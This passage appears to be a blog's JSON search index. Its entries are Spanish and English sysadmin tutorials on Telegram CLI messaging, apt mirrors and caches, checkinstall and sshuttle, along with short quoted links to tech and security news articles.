registrado la aplación al instalarla, recibiremos el mensaje directamente como leído y no nos lo notificará. En lugar de utilizar expect , tenemos otras alternativas: Utilizando el propio telegram El propio cliente acepta el parámetro -W que se puede utilizar para enviar mensajes: bash $ echo -e \"msg NombreContacto Lorem impsum dolor sit amet\\rquit\" | telegram -W Utilizando screen Podemos dejar el cliente en ejecución en una sesión de screen y enviar comandos desde otra: bash $ screen -dmS session_id telegram bash $ screen -S session_id -X eval \"stuff 'msg NombreContacto Lorem impsum dolor sit amet'\\r\" Utilizando tuberías Podemos crear una tubería que alimente el cliente y enviar comandos a través de ella: bash $ mkfifo in $ telegram /dev/null & $ echo > in $ echo \"msg NombreContacto Lorem impsum dolor sit amet\" > in Notificación de mensajes nuevos Este cliente permite utilizar scripts en LUA, de tal manera que podemos llevar a cabo acciones para todo tipo de eventos. Por ejemplo, podemos ejecutar el comando notify-send cada vez que nos llega un mensaje, para que nos aparezca una notificación en pantalla. Su uso es sencillo. Nos bajamos el script , cortesía de AleixDev, y ejecutamos: bash $ telegram -s /path/to/notify.lua if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/05/31/enviar-y-reicibir-notificaciones-de-telegram-desde-la-linea-de-comandos/","loc":"https://karpoke.ignaciocano.com/2014/05/31/enviar-y-reicibir-notificaciones-de-telegram-desde-la-linea-de-comandos/"},{"title":"Programming is social","text":"Programming is social, too. Most people think it's not. With assistance from media portrayals of programmers and sloppy stereotypes of our own, they think most of us would prefer to work alone in the dark. Some do, of course, but even then most programmers I know like to talk shop with other programmers all the time. They like to talk about the places where they are stuck, as well as the places they used to be stuck. War stories are the currency of the programmer community. Eugene Wallingford | cs.uni.edu","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/31/programming-is-social/","loc":"https://karpoke.ignaciocano.com/2014/05/31/programming-is-social/"},{"title":"Unsafe cookies leave WordPress accounts open to hijacking, 2-factor bypass","text":"Yan Zhu, a staff technologist at the Electronic Frontier Foundation, came to that determination after noticing that WordPress servers send a key browser cookie in plain text, rather than encrypting it, as long mandated by widely accepted security practices. The cookie, which carries the tag \"wordpress_logged_in,\" is set once an end user has entered a valid WordPress user name and password. It's the website equivalent of a plastic bracelets used by nightclubs. Once a browser presents the cookie, WordPress servers will usher the user behind a velvet rope to highly privileged sections that reveal private messages, update some user settings, publish blog posts, and more. The move by WordPress engineers to allow the cookie to be transmitted unencrypted makes them susceptible to interception in many cases. Dan Goodin | arstechnica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/26/unsafe-cookies-leave-wordpress-accounts-open-to-hijacking-2-factor-bypass/","loc":"https://karpoke.ignaciocano.com/2014/05/26/unsafe-cookies-leave-wordpress-accounts-open-to-hijacking-2-factor-bypass/"},{"title":"netcat - Cycles Per Instruction","text":"Welcome to the most unnecessarily complicated netcat album release format yet. In this repository, you will be able to compile your own kernel module, create a /dev/netcat device and redirect its output into an audio player (tested with mplayer and play from SoX as well). ogg123 - < /dev/netcat ;' Brandon Lucia, Andrew Olmstead, and David Balatero github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/25/netcat-cycles-per-instruction/","loc":"https://karpoke.ignaciocano.com/2014/05/25/netcat-cycles-per-instruction/"},{"title":"Exploring limits of covert data collection on Android: apps can take photos with your phone without you knowing","text":"Android apps can take photos with your phone in background phones without displaying any notification and you won't see the app on the list of installed applications. App can send the photos over the internet to their private server. You can also find video with demo in this post. Szymon Sidor | snacksforyourmind.blogspot.co.uk","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/25/exploring-limits-of-covert-data-collection-on-android-apps-can-take-photos-with-your-phone-without-you-knowing/","loc":"https://karpoke.ignaciocano.com/2014/05/25/exploring-limits-of-covert-data-collection-on-android-apps-can-take-photos-with-your-phone-without-you-knowing/"},{"title":"Bash implementation of 2048 game","text":"Bash 2048 v1.1 (https://github.com/mydzor/bash2048) pieces=16 target=2048 score=2884 /------|------|------|------\\ | 4 | 2 | 8 | 4 | |------|------|------|------| | 2 | 16 | 256 | 32 | |------|------|------|------| | 16 | 32 | 16 | 2 | |------|------|------|------| | 2 | 8 | 128 | 4 | \\------|------|------|------/ GAME OVER Your score: 2884 You have lost, better luck next time. ;' mydzor github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/24/bash-implementation-of-2048-game/","loc":"https://karpoke.ignaciocano.com/2014/05/24/bash-implementation-of-2048-game/"},{"title":"Aunque parezca mentira, siguen existiendo BBS","text":"Belky es el \"sysop\" (administrador) de VampireBBS. Anda estos días muy contento porque ha puesto de nuevo en marcha su vieja BBS. 32 personas accedieron al sistema nada más inaugurarlo, lo que en este prehistórico mundo es un éxito. Las BBS fueron, en la década de los 80 y 90, la Internet de la gente de la calle, la red a la medida humana, precursoras de todo lo que vendría después y centros de aprendizaje para muchos programadores, administradores y, en general, hackers. Hoy quedan muy pocas en pie, sólo tres en España, pero están decididas a no morir. ;' Mercë Molist elmundo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/24/aunque-parezca-mentira-siguen-existiendo-bbs/","loc":"https://karpoke.ignaciocano.com/2014/05/24/aunque-parezca-mentira-siguen-existiendo-bbs/"},{"title":"SSD breakthrough means 300% speed boost, 60% less power usage... even on old drives","text":"A breakthrough has been made in SSD technology that could mean drastic performance increases due to the overcoming of one of the major issues in the memory type. Currently, data cannot be directly overwritten onto the NAND chips used in the devices. Files must be written to a clean area of the drive whilst the old area is formatted. This eventually causes fragmented data and lowers the drive's life and performance over time. James Walker neowin.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/24/ssd-breakthrough-means-300-speed-boost-60-less-power-usage-even-on-old-drives/","loc":"https://karpoke.ignaciocano.com/2014/05/24/ssd-breakthrough-means-300-speed-boost-60-less-power-usage-even-on-old-drives/"},{"title":"TRS Drawbot","text":"On a standard headphone plug, the left channel comes through the outer \"tip\" contact, the right channel through the middle \"ring\" contact, and the ground connection through the inner \"sleeve\" contact. The acronym for these so-called \"tip-ring-sleeve\" connectors is where TRS Drawbot gets its name. It has no microchips or circuit boards and uses free software to turn line graphics into sound files that make almost any audio device into an on-the-go robot controller. Sean Michael Tragan and Mikal Hart | TRS Drawbot","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/24/trs-drawbot/","loc":"https://karpoke.ignaciocano.com/2014/05/24/trs-drawbot/"},{"title":"Why Java is a compiled language and Python is not","text":"One comment's answer was 'marketing', which in a sense is correct; one reason we call Java a compiled language is that that's what Sun called it from the start. Another comment noted that Java has an explicit compilation phase that is separate from having the JVM execute your Java program by interpreting the bytecodes. All of this points us towards what I feel is the real answer: In Java, bytecode is a first class object. In Python it's an internal implementation detail. Chris Siebenmann | utcc.utoronto.ca","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/24/why-java-is-a-compiled-language-and-python-is-not/","loc":"https://karpoke.ignaciocano.com/2014/05/24/why-java-is-a-compiled-language-and-python-is-not/"},{"title":"Script-injected \"async scripts\" considered harmful","text":"The inline JavaScript solution has a subtle, but very important (and an often overlooked) performance gotcha: inline scripts block on CSSOM before they are executed. Why? The browser does not know what the inline block is planning to do in the script it is about to execute, and because JavaScript can access and manipulate the CSSOM, it blocks and waits until the CSS is downloaded, parsed, and the CSSOM is constructed and available. Ilya Grigorik | Script-injected \"async scripts\" considered harmful \"Script-injected \"async scripts\" considered harmful\"","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/05/23/script-injected-async-scripts-considered-harmful/","loc":"https://karpoke.ignaciocano.com/2014/05/23/script-injected-async-scripts-considered-harmful/"},{"title":"Crear un repositorio espejo de Ubuntu","text":"Si tenemos un gran número de equipos con Ubuntu en nuestra LAN, nos puede interesar tener un espejo local del repositorio de paquetes de Ubuntu. Una diferencia entre esta opción y utilizar un proxy/caché de paquetes es que, en el primer caso, ya tendremos todos los paquetes disponibles cuando los vayamos a necesitar. Clonar el repositorio en local Para crear un repositorio local, podemos usar el comando apt-mirror , disponible en los repositorios. Una vez instalado, podemos editar el fichero de configuración en /etc/apt/mirror.list para, por ejemplo, cambiar el directorio donde se guardarán los paquetes (por defecto /var/spool/apt-mirror ), añadir o eliminar fuentes a incluir en el repositorio, etc. Con las fuentes por defecto, hay que tener en cuenta que serán necesarios más de 100 GB para alojar el repositorio. Si optásemos sólo por incluir el \"main\", se queda en 10 GB. Luego, lo ejecutamos: ```bash $ sudo apt-mirror Downloading 162 index files using 20 threads... Begin time: Sat May 17 12:31:22 2014 [20]... [19]... [18]... [17]... [16]... [15]... [14]... [13]... [12]... [11]... [10]... [9]... [8]... [7]... [6]... [5]... [4]... [3]... [2]... [1]... [0]... End time: Sat May 17 12:32:02 2014 Processing tranlation indexes: [TTT] Downloading 185 translation files using 20 threads... Begin time: Sat May 17 12:32:02 2014 [20]... [19]... [18]... [17]... [16]... [15]... [14]... [13]... [12]... [11]... [10]... [9]... [8]... [7]... [6]... [5]... [4]... [3]... [2]... [1]... [0]... End time: Sat May 17 12:33:13 2014 Processing indexes: [SSSPPP] 110.1 GiB will be downloaded into archive. Downloading 111238 archive files using 20 threads... Begin time: Sat May 17 12:33:28 2014 [20]... ``` Actualizar el repositorio local Para mantener el repositorio actualizado, bastará editar el fichero de configuración del cron para que se ejecute periódicamente: bash $ sudo vim /etc/cron.d/apt-mirror 0 4 * * * apt-mirror /usr/bin/apt-mirror > /var/spool/apt-mirror/var/cron.log Actualizaciones del propio servidor Si queremos que el propio servidor utilice el espejo local, deberemos cambiar las fuentes del /etc/apt/sources.list para que, en lugar de consultar el repositorio remoto, consulte el fichero local. Algo, así: ```bash deb http://archive.ubuntu.com/ubuntu/ trusty main universe deb file:/var/spool/apt-mirror/mirror/archive.ubuntu.com/ubuntu trusty main universe ``` Configurar el servidor web Por último, sólo queda que el repositorio sea accesible para los clientes a través del servidor web. En este caso, crearemos un nuevo host virtual para Apache2, por ejemplo, /etc/apache2/sites-available/deb.example.com.conf : ```bash ServerName deb.example.com DocumentRoot /var/spool/apt-mirror/mirror/archive.ubuntu.com Options Indexes FollowSymLinks MultiViews AllowOverride Limit Options FileInfo Indexes Require all granted ErrorLog ${APACHE_LOG_DIR}/deb.example.com-error.log CustomLog ${APACHE_LOG_DIR}/deb.example.com-access.log combined vim: syntax=apache ts=4 sw=4 sts=4 sr noet ``` Lo activamos y reiniciamos apache: bash $ sudo a2ensite deb.example.com.conf $ sudo apache2ctl configtest && sudo apache2ctl graceful Si todo ha ido bien, veremos dos directorios listados en la URL http://deb.example.com/ubuntu/. Configuración de los clientes Para que el resto de equipos comiencen a utilizar el repositorio local, deberemos editar el fichero de fuentes ( /etc/apt/sources.list ) y sustituir las que había por las del repositorio que acabamos de crear: ```bash deb http://archive.ubuntu.com/ubuntu/ trusty main universe deb http://deb.example.com/ubuntu/ trusty main universe ``` Como comentario, las fuentes relativas a actualizaciones de seguridad las dejaría como está, para que se sigan descargando desde los repositorios originales: bash deb http://security.ubuntu.com/ubuntu trusty-security main restricted universe multiverse Sólo resta actualizar la lista de paquetes disponibles: bash $ sudo aptitude update Referencias » Creating an Ubuntu repository mirror with apt-mirror","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/05/18/crear-un-repositorio-espejo-de-ubuntu/","loc":"https://karpoke.ignaciocano.com/2014/05/18/crear-un-repositorio-espejo-de-ubuntu/"},{"title":"Caché de paquetes descargados en Ubuntu Trusty Tahr","text":"Si tenemos una LAN con varios equipos, podemos utilizar apt-cacher-ng para no tener que descargar las actualizaciones desde los repostiorios en cada uno de ellos, ya que nos permite reutilizar los paquetes que hayamos descargado. Otras opciones, como AptProxy parece que han quedado algo obsoletas. apt-cacher-ng es un proxy/caché enfocado a gestores de paquetes, que soporta las distribuciones Debian y Ubuntu, entre otras. Es una buena alternativa a montar un espejo para pequeñas LANs. Servidor El equipo en que se instale es el que hará de servidor y el resto serán los clientes. Se puede instalar desde los repositorios. Una vez instalado, editaremos el fichero /etc/services para añadir los puertos que utiliza (esto no será útil cuando, por ejemplo, analicemos el tráfico de red): ```bash Local services apt-cacher-ng 3142/tcp apt-cacher-ng 3142/udp ``` Para arrancar el servicio: bash $ sudo service apt-cacher-ng start Si tenemos un cortafuegos activo, deberemos abrir dicho puerto. Por ejemplo, si usamos ufw : bash $ sudo ufw allow from 192.168.0.0/24 to any port 3142 Podemos importar los paquetes que ya tengamos descargados. Tal como sugiere la documentación en la página de mantenimiento, creamos el directorio _import , añadimos un enlace simbólico a la caché de paquetes de apt y pulsamos en el botón de importar: bash $ cd /var/cache/apt-cacher-ng/ $ sudo mkdir _import $ sudo chown apt-cacher-ng:apt-cacher-ng _import/ $ cd _import/ $ sudo ln -s /var/cache/apt/archives Ahora sólo queda pulsar en el botón de Importar, o visitar el siguiente enlace: bash $ w3m \"http://192.168.0.50:3142/acng-report.html?abortOnErrors=aOe&doImport=Start+Import&calcSize=cs&asNeeded=an#bottom\" Clientes En los clientes, lo único que hay que hacer es añadir un archivo de configuración para apt, por ejemplo /etc/apt/apt.conf.d/02proxy que apunte al servidor: bash Acquire::http::Proxy \"http://192.168.0.50:3142\"; 192.168.0.50 es la IP del servidor, aunque también podríamos poner un nombre de dominio. Sólo queda actualizar los paquetes: bash $ sudo aptitude update Mantenimiento En la URL http://192.168.0.50:3142/acng-report.html nos muestra una página donde se pueden ver algunas estadísticas y realizar algunas acciones, como vaciar la caché. Referencias » apt-cacher-ng » Apt-Cacher-NG User Manual » Install Apt-Cacher-NG – Ubuntu","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/05/17/cache-de-paquetes-descargados-en-ubuntu-trusty-tahr/","loc":"https://karpoke.ignaciocano.com/2014/05/17/cache-de-paquetes-descargados-en-ubuntu-trusty-tahr/"},{"title":"Exclusión de URLs cuando usamos django-debug-toolbar","text":"django-debug-toolbar es una aplicación para Django que nos muestra información de depuración acerca de las diferentes peticiones y respuestas que se llevan a cabo en el servidor: variables de contexto, cabeceras, peticiones SQL, etc. Sin embargo, hay algunas URLs para las cuales nos puede interesar que no se analicen, como por ejemplo, peticiones que se hagan por Ajax o URLs relativas a diversas aplicaciones instaladas, como el panel de administración, Rosetta, etc. Una forma sencilla de lograr esto es utilizando la variable de configuración SHOW_TOOLBAR_CALLBACK , la cual debe apuntar a la función que determine si se debe mostrar la barra o no (por defecto, se comprueba el valor de la variable DEBUG). Por ejemplo, si no queremos mostrar la barra para diferentes URLs, hasta la versión 1.0, podemos hacer lo siguiente: ```python def show_toolbar(request): for url in DEBUG_TOOLBAR_CONFIG[\"IGNORE_URIS\"]: if re.search(url, request.path): return False return True DEBUG_TOOLBAR_CONFIG = { 'IGNORE_URIS': ( '&#94;/admin', '&#94;/rosetta', ), 'SHOW_TOOLBAR_CALLBACK': show_toolbar, } ``` A partir de la versión 1.0 , el nombre de la función se debe especificar como una ruta separada por puntos: bash 'SHOW_TOOLBAR_CALLBACK': 'projectname.settings.show_toolbar',","tags":"dev","url":"https://karpoke.ignaciocano.com/2014/05/15/exclusion-de-urls-cuando-usamos-django-debug-toolbar/","loc":"https://karpoke.ignaciocano.com/2014/05/15/exclusion-de-urls-cuando-usamos-django-debug-toolbar/"},{"title":"Crear paquetes .deb con checkinstall","text":"Una forma sencilla de crear un paquete .deb a partir del código fuente es mediante la utilidad checkinstall , disponible en los respositorios. Para aquellos casos en los que la compilación del código y la instalación sigue los conocidos comandos: bash $ ./configure $ make $ sudo make install Bastará sustituir el último paso por: bash $ sudo checkinstall Como ejemplo, podemos crear un .deb a partir del código fuente de libsodium , una librería necesaria para compilar dnscrypt. Descargamos la última versión y comprobamos la firma: bash $ wget https://download.libsodium.org/libsodium/releases/libsodium-0.4.5.tar.gz $ dig +dnssec +short txt libsodium-0.4.5.tar.gz.download.libsodium.org \"7ad5202df53eeac0eb29b064ae5d05b65d82b2fc1c082899c9c6a09b0ee1ac32\" $ shasum -a 256 libsodium-0.4.2.tar.gz 7ad5202df53eeac0eb29b064ae5d05b65d82b2fc1c082899c9c6a09b0ee1ac32 libsodium-0.4.5.tar.gz (Otra opción sería comprobar el fichero .sig disponible también para descargar desde su página.) Descomprimimos el fichero y lo compilamos: bash $ tar xzf libsodium-0.4.5.tar.gz $ cd libsodium-0.4.5/ $ ./configure $ make -j2 $ make check Ahora es cuando creamos el paquete .deb: bash $ sudo checkinstall Nos pedirá que añadamos una pequeña descripción del paquete y que confirmemos una serie de datos relacionados con el mismo. Si quisiéramos apadrinar un paquete, sería tan sencillo como poner nuestro nombre, forma de contacto y dirección de descarga. ```bash checkinstall 1.6.2, Copyright 2009 Felipe Eduardo Sanchez Diaz Duran Este software es distribuído de acuerdo a la GNU GPL The package documentation directory ./doc-pak does not exist. Should I create a default set of package docs? [y]: n Por favor escribe una descripción para el paquete. Termina tu descripcion con una linea vacia o con EOF. libsodium is an easy-to-use crypto library. Its goal is to provide all of the core operations needed to build higher-level cryptographic tools. * Debian package creation selected * * * * * * * Este paquete será creado de acuerdo a estos valores: 0 - Maintainer: [ nacho AT ignaciocano DOT com ] 1 - Summary: [ libsodium is an easy-to-use crypto library. Its goal is to provide all of the core operations needed to build higher-level cryptographic tools. ] 2 - Name: [ libsodium ] 3 - Version: [ 0.4.5 ] 4 - Release: [ 1 ] 5 - License: [ GPL ] 6 - Group: [ checkinstall ] 7 - Architecture: [ i386 ] 8 - Source location: [ libsodium-0.4.5 ] 9 - Alternate source location: [ ] 10 - Requires: [ ] 11 - Provides: [ libsodium ] 12 - Conflicts: [ ] 13 - Replaces: [ ] Introduce un número para cambiar algún dato u oprime ENTER para continuar: ``` Si todo ha ido bien, ya tendremos el paquete creado e instalado. Si quisiéramos eliminarlo: bash $ sudo dpkg -r libsodium Actualizado el 26 de abril de 2015 Si no queremos que se instale justo después de crear el paquete, tenemos varias opciones : Utilizar el argumento --install=no Editar el fichero de configuración /etc/checkinstallrc y cambiar INSTALL=1 por INSTALL=0 Alternativamente, podemos crear el paquete de forma automatizada, pasando la información en forma de argumentos. Por ejemplo: bash $ sudo checkinstall --default --install=no --maintainer=\"nacho AT ignaciocano DOT com\" --pkgname=libsodium --pkgversion=0.4.5 --pkgrelease=1 --pkglicense=GPL --pkggroup=checkinstall --pkgarch=i386 --pkgsource=libsodium-0.4.5 --pkgaltsource= --requires= --provides=libsodium La descripción del paquete se toma del contenido del fichero description-pak , que deberemos crear previamente. Podemos comprobar la información del paquete mediante dpkg -I (o rpm -qi si es un .rpm ): bash $ dpkg -I libsodium_0.4.5-1_i386.deb paquete debian nuevo, versión 2.0. tamaño 388804 bytes: archivo de control= 383 bytes. 0 bytes, 0 líneas conffiles 332 bytes, 9 líneas control Package: libsodium Priority: extra Section: checkinstall Installed-Size: 2492 Maintainer: nacho AT ignaciocano DOT com Architecture: i386 Version: 0.4.5-1 Provides: libsodium Description: libsodium is an easy-to-use crypto library. Its goal is to provide all of the core operations needed to build higher-level cryptographic tools. Ya que estamos, también he creado un .deb para dnscrypt. Si queréis ahorraros el trabajo, aquí tenéis ambos paquetes .deb: » libsodium_0.4.5-1_i386.deb » dnscrypt-proxy_1.4.0-1_i386.deb Referencias » Checkinstall, crear paquetes .deb fácilmente a partir del código » How to compile and install DNScrypt » Checkinstall README","tags":"admin","url":"https://karpoke.ignaciocano.com/2014/05/10/crear-paquetes-deb-con-checkinstall/","loc":"https://karpoke.ignaciocano.com/2014/05/10/crear-paquetes-deb-con-checkinstall/"},{"title":"Reverse Engineering a Furby","text":"This past semester I've been working on a directed study at my university with Prof. Wil Robertson reverse engineering embedded devices. After a couple of months looking at a passport scanner, one of my friends jokingly suggested I hack a Furby, the notoriously annoying toy of late 1990s fame. Everyone laughed, and we all moved on with our lives. However, the joke didn't stop there. Within two weeks, this same friend said they had a present for me. And that's how I started reverse engineering a Furby. Michael Coppola | poppopret.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/01/18/reverse-engineering-a-furby/","loc":"https://karpoke.ignaciocano.com/2014/01/18/reverse-engineering-a-furby/"},{"title":"xkcd 1313: Something is Wrong on the Internet!","text":"I found that the rollover text, \" /bu|[rn]t|[coy]e|[mtg]a|j|iso|n[hl]|[ae]d|lev|sh|[lnd]i|[po]o|ls/ matches the last names of elected US presidents but not their opponents.\", is obviously false. After all there are several last names (like \"Nixon\" and \"Bush\") that denote both elected presidents and opponents. So no regular expression could both match and not match \"Nixon\". So that got me thinking: if we ignore names that are both winners and losers, what regular expression does cover the winners and not the losers? And let's try to find a short one, although perhaps not the very shortest. » nbviewer.ipython.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/01/07/xkcd-1313-something-is-wrong-on-the-internet/","loc":"https://karpoke.ignaciocano.com/2014/01/07/xkcd-1313-something-is-wrong-on-the-internet/"},{"title":"Un ejército de 'frikis' contra Telefónica","text":"Hubo un tiempo en que sólo había un camino para surcar las redes: la Compañía Telefónica Nacional de España. Y una sola pensamiento profundo de los hackers: engañarla para surcar estas redes sin pagar nada. Entonces cogió gran importancia una especialidad, dentro de las artes del hacking, llamada 'phreaking' (http://hackstory.net/phreaking), contracción de 'phone' (teléfono) y 'freak' (monstruo). Los 'phreakers' tienen gran conocimiento de las líneas telefónicas y saben, entre otras cosas, como usarlas para llamar gratis. En los años 80 y 90 no había grupo de hackers que no contase entre sus filas con uno o más buenos 'phreakers'. Mercé Molist | elmundo.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2014/01/07/un-ejercito-de-frikis-contra-telefonica/","loc":"https://karpoke.ignaciocano.com/2014/01/07/un-ejercito-de-frikis-contra-telefonica/"},{"title":"fix ubuntu","text":"If you're an Ubuntu user and you're using the default settings, each time you start typing in Dash (to open an application or search for a file on your computer), your search terms get sent to a variety of third parties, some of which advertise to you. Ubuntu should protect user privacy by default. Since it doesn't, you can use the code to the left to disable the parts of Ubuntu which are invasive to your privacy. » fixubuntu.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/12/15/fix-ubuntu/","loc":"https://karpoke.ignaciocano.com/2013/12/15/fix-ubuntu/"},{"title":"Álbum para celebrar los 30 años de la FAMICOM/NES","text":"A finales de 1983 la compañía Nintendo sacó al mercado la consola FAMICOM en Japón, a los pocos años se comercializó también por Europa y América bajo el nombre de NES. Para celebrar sus treinta años de existencia algunos entusiastas han decidido no quedarse de brazos cruzados y le han hecho un merecido homenaje, usándola para componer un CD de música que se distribuye de manera gratuita bajo licencia Creative Commons. » sawsquarenoise.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/12/15/album-para-celebrar-los-30-anos-de-la-famicomnes/","loc":"https://karpoke.ignaciocano.com/2013/12/15/album-para-celebrar-los-30-anos-de-la-famicomnes/"},{"title":"Este es el hombre que terminará por destruir Silicon Valley","text":"El cumplimiento de la ecuación de Moore ha sido posible hasta la fecha gracias a la reducción constante del tamaño y el precio de los chips, unido al aumento de su potencia de cálculo. Sin embargo, los límites de la física están comenzando a imponerse sobre los pronósticos de Moore. David Pérez | elconfidencial.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/11/18/este-es-el-hombre-que-terminara-por-destruir-silicon-valley/","loc":"https://karpoke.ignaciocano.com/2013/11/18/este-es-el-hombre-que-terminara-por-destruir-silicon-valley/"},{"title":"Descansad en paz, hackers.","text":"Llevamos unos días en los que nos hemos enterado vía twitter de grandes pérdidas para la comunidad de seguridad informática a nivel mundial. Los más recientes, y en muy poco espacio de tiempo, Cédric Blancher y Péter Sz r (este último, hace un par de días, el 12 de Noviembre). José A. Guasch | securitybydefault.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/11/17/descansad-en-paz-hackers/","loc":"https://karpoke.ignaciocano.com/2013/11/17/descansad-en-paz-hackers/"},{"title":"Command-line Forensics of hacked PHP.net","text":"The good people from Barracuda Labs were kind enough to share a PCAP file from the PHP.net compromize on their blog. I decided to have a closer look at that PCAP file to see what can be extracted from it. Since the PCAP contains Windows malware I played safe and did all the analysis on a Linux machine with no Internet connectivity. Erik Hjelmvik | netresec.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/11/05/command-line-forensics-of-hacked-php-net/","loc":"https://karpoke.ignaciocano.com/2013/11/05/command-line-forensics-of-hacked-php-net/"},{"title":"Make a Raspberry Pi into a Anonymizing Tor Proxy!","text":"Feel like someone is snooping on you? Browse anonymously anywhere you go with the Onion Pi Tor proxy. This is fun weekend project that uses a Raspberry Pi, a USB WiFi adapter and Ethernet cable to create a small, low-power and portable privacy Pi. Using it is easy-as-pie. First, plug the Ethernet cable into any Internet provider in your home, work, hotel or conference/event. Next, power up the Pi with the micro USB cable to your laptop or to the wall adapter. The Pi will boot up and create a new secure wireless access point called Onion Pi. Connecting to that access point will automatically route any web browsing from your computer through the anonymizing Tor network. Ladyada | adafruit.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/11/04/make-a-raspberry-pi-into-a-anonymizing-tor-proxy/","loc":"https://karpoke.ignaciocano.com/2013/11/04/make-a-raspberry-pi-into-a-anonymizing-tor-proxy/"},{"title":"FreeNAS","text":"FreeNAS es un sistema operativo basado en FreeBSD pero orientado a servicios de almacenamiento en red. NAS corresponde a las siglas de \"almacenamiento conectado en red\". FreeNAS y su fork Nas4Free son gratuitos, Nas4Free es open-source basado en licencia BSD. Estos sistemas operativos permiten crear un servidor doméstico muy potente con multitud de opciones de configuración como por ejemplo administración de decenas de usuarios con los permisos adecuados, crear unidades RAID para hacer copias de seguridad redundantes o aumentar el rendimiento del sistema. » redeszone.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/11/03/freenas/","loc":"https://karpoke.ignaciocano.com/2013/11/03/freenas/"},{"title":"25 años del gusano de Morris","text":"El bicho explotaba vulnerabilidades en distintos servicios, como un fallo en el modo debug de sendmail, un buffer overflow en fingerd y una incorrecta configuración del rsh/rexec que permitía saltar entre equipos sin validación. Además de los clásicos usuarios y contraseñas débiles. Alejandro Ramos | securitybydefault.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/11/02/25-anos-del-gusano-de-morris/","loc":"https://karpoke.ignaciocano.com/2013/11/02/25-anos-del-gusano-de-morris/"},{"title":"sshuttle, la VPN de los pobres","text":"shuttle es una herramienta que nos permite redirigir todo el tráfico a través de una conexión SSH, incluyendo las peticiones DNS. Está disponible tanto en los repositorios como en GitHub. Su uso es sencillo. Para establecer la conexión: bash $ sshuttle --D --pidfile=/tmp/sshuttle.pid -r user@server:1234 --dns 0/0 Para terminarla: bash $ kill $(cat /tmp/sshuttle.pid)","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/10/20/sshuttle-la-vpn-de-los-pobres/","loc":"https://karpoke.ignaciocano.com/2013/10/20/sshuttle-la-vpn-de-los-pobres/"},{"title":"The 30 CSS Selectors you Must Memorize","text":"So you learned the base id, class, and descendant selectors – and then called it a day? If so, you're missing out on an enormous level of flexibility. While many of the selectors mentioned in this article are part of the CSS3 spec, and are, consequently, only available in modern browsers, you owe it to yourself to commit these to memory. Jeffrey Way | 